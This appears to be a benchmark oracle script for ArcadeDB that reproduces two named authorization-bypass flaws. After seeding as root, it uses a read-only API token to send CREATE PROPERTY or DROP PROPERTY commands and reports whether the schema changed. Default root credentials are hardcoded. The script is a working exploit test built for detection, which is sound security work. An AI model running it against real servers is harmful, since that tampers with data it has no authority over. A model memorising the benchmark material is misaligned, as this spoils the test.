#!/usr/bin/env python3
"""
PatchClosure-Bench oracle for ArcadeDB CVE-2026-44221 -> CVE-2026-54076.

BENIGN authz canary. A READ-ONLY API token (permissions.database=[],
types.*.access=["readRecord"] -> NO updateSchema) attempts a schema-mutating
DDL over EXTERNAL HTTP `POST /api/v1/command/<db>`.

Detection == the schema mutation SUCCEEDS, which a read-only token must NOT be
able to do. Success is confirmed two ways:
  1. the DDL HTTP call returns 2xx (not a 403 / authorization error), AND
  2. an ADMIN follow-up schema query shows the planted schema state actually
     changed (property dropped, or new property appeared).

Two payloads:
  - "original"  (CVE-2026-44221): CREATE PROPERTY via read-only token.
                 succeeds@V0, blocked@V1 (createProperty got the check).
  - "residual"  (CVE-2026-54076): DROP PROPERTY  via read-only token.
                 succeeds@V1 (dropProperty still unchecked), blocked@V2.

Usage: oracle.py <base_url> <original|residual>  -> prints JSON verdict, exit 0
The seeding (create db, seed schema with the planted ${PCB_FLAG} property, mint
the read-only token) is done here as ROOT; the ATTACK uses only the token.
"""
import json, os, sys, time, urllib.request, urllib.error, base64

DB = "pcb"
TYPE = "Widget"
FLAG = os.environ.get("PCB_FLAG", "pcbflag_deadbeef")   # planted property name (canary)
ROOT_USER, ROOT_PW = "root", "playwithdata"


def _req(base, method, path, body=None, auth=None):
    url = base.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Content-Type", "application/json")
    if auth == "root":
        tok = base64.b64encode(f"{ROOT_USER}:{ROOT_PW}".encode()).decode()
        r.add_header("Authorization", "Basic " + tok)
    elif auth:  # bearer api token string
        r.add_header("Authorization", "Bearer " + auth)
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, str(e)


def wait_ready(base, secs=180):
    for _ in range(secs):
        st, _b = _req(base, "GET", "/api/v1/ready")
        if st == 204 or st == 200:
            return True
        time.sleep(1)
    return False


def root_sql(base, sql, endpoint="command"):
    return _req(base, "POST", f"/api/v1/{endpoint}/{DB}",
                {"language": "sql", "command": sql}, auth="root")


def seed(base, payload="x"):
    # create database (ignore "already exists")
    _req(base, "POST", "/api/v1/server", {"command": f"create database {DB}"}, auth="root")
    # seed schema as ROOT (admin) -- legitimate schema owner
    root_sql(base, f"CREATE DOCUMENT TYPE {TYPE} IF NOT EXISTS")
    # CREATE PROPERTY has no IF NOT EXISTS clause in ArcadeDB SQL; re-runs just
    # error with "already exists" which is harmless for seeding.
    root_sql(base, f"CREATE PROPERTY {TYPE}.label STRING")
    root_sql(base, f"CREATE PROPERTY {TYPE}.{FLAG} STRING")  # planted canary
    # mint a READ-ONLY api token scoped to DB: no database-level access (no updateSchema),
    # only readRecord on all types.
    perms = {"database": [], "types": {"*": {"access": ["readRecord"]}}}
    # token name must be unique per server lifetime; include payload salt
    tname = "readonly_" + FLAG + "_" + payload
    st, body = _req(base, "POST", "/api/v1/server/api-tokens",
                    {"name": tname, "database": DB, "permissions": perms}, auth="root")
    token = None
    try:
        token = json.loads(body)["result"]["token"]
    except Exception:
        pass
    return st, body, token


def schema_props(base):
    """ADMIN read of Widget's property names -> set."""
    st, body = root_sql(base, f"SELECT name, properties FROM schema:types WHERE name = '{TYPE}'",
                        endpoint="query")
    props = set()
    try:
        rows = json.loads(body).get("result", [])
        for row in rows:
            for p in row.get("properties", []) or []:
                if isinstance(p, dict):
                    props.add(p.get("name"))
                else:
                    props.add(p)
    except Exception:
        pass
    return st, props, body


def run(base, payload):
    if not wait_ready(base):
        print(json.dumps({"error": "server never became ready", "base": base}))
        sys.exit(2)
    sst, sbody, token = seed(base, payload)
    if not token:
        print(json.dumps({"error": "could not mint read-only token", "seed_status": sst,
                          "seed_body": sbody[:400]}))
        sys.exit(2)

    _st0, before, _ = schema_props(base)

    if payload == "original":
        # CVE-2026-44221 vector: createProperty via read-only token
        newprop = "injected_" + FLAG
        ddl = f"CREATE PROPERTY {TYPE}.{newprop} STRING"
        st, body = _req(base, "POST", f"/api/v1/command/{DB}",
                        {"language": "sql", "command": ddl}, auth=token)
        _st1, after, _ = schema_props(base)
        mutated = (newprop in after) and (newprop not in before)
    elif payload == "residual":
        # CVE-2026-54076 vector: dropProperty (unchecked sibling mutator) via read-only token
        ddl = f"DROP PROPERTY {TYPE}.{FLAG}"
        st, body = _req(base, "POST", f"/api/v1/command/{DB}",
                        {"language": "sql", "command": ddl}, auth=token)
        _st1, after, _ = schema_props(base)
        mutated = (FLAG in before) and (FLAG not in after)
    else:
        print(json.dumps({"error": "unknown payload " + payload}))
        sys.exit(2)

    # "detected" == a read-only token successfully mutated the schema.
    detected = bool(mutated) and (200 <= st < 300)
    verdict = {
        "base": base,
        "payload": payload,
        "ddl": ddl,
        "read_only_token_prefix": token[:6] + "...",
        "ddl_http_status": st,
        "ddl_response": body[:300],
        "schema_before": sorted(x for x in before if x),
        "schema_after": sorted(x for x in after if x),
        "schema_mutated_by_readonly_token": bool(mutated),
        "detected": detected,   # True => authz bypass reproduced
    }
    print(json.dumps(verdict, indent=2))
    return detected


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("usage: oracle.py <base_url> <original|residual>")
        sys.exit(2)
    run(sys.argv[1], sys.argv[2])
